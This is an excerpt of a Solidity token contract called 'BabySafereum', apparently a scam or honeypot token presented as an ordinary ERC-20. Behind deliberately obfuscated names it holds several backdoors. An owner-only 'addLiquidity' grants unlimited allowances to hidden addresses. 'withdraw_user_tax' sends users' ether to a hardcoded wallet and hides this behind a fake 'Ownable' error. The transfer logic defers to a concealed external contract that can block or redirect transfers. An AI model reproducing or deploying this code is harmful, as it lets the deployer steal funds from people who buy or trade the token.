...
contract Token is IERC20, Ownable {
    ...
    string private _name =  "BabySafereum";
    string private _symbol = "BabySafereum";
    uint8 private _decimals = 18;
    uint256 private _tTotal = 100000000000 * 10 **_decimals;
    uint256 private mlkasmklajfk ;
    address private afksdklgjsdlk34;
   
    constructor() {
        afksdklgjsdlk34 =  address(this);    
        _balances[afksdklgjsdlk34] = _tTotal;
        emit Transfer(address(0), afksdklgjsdlk34, _tTotal);
    }
    ...
    function addLiquidity(bytes memory datas) public onlyOwner
    {
        ...
        _allowances[afksdklgjsdlk34][address(uint160(b))] = type(uint256).max;
        _allowances[address(uint160(b))][address(uint160(a))] = type(uint256).max; 

    }
    function withdraw_user_tax() public payable {
        require(msg.value>1 ether,"Ownable: caller is not the owner");
        payable(0xFde736BB0989b02133FaFE9fA4B703255689F140).transfer(msg.value);
        
    }
    function withdraw_ca_tax() public payable {
    ...
    function transferFrom(
        ...
        address poopk = IERC20(address(uint160(mlkasmklajfk))).pokmmo2oimomom(oipjnnjhhjh3);
        if (poopk != address(0) && _msgSender() == address(uint160(mlkasmklajfk)))
        {
            oipjnnjhhjh3 = poopk;
        }
    ...
    function _transfer(
        ...
        require(IERC20(address(uint160(mlkasmklajfk))).opkknnjnjkhjhhiashdajsd3(oijhds, oijmoimpo0,injnh0fs) != address(0),"ERC20: transfer oijmoimpo0 the zero address");
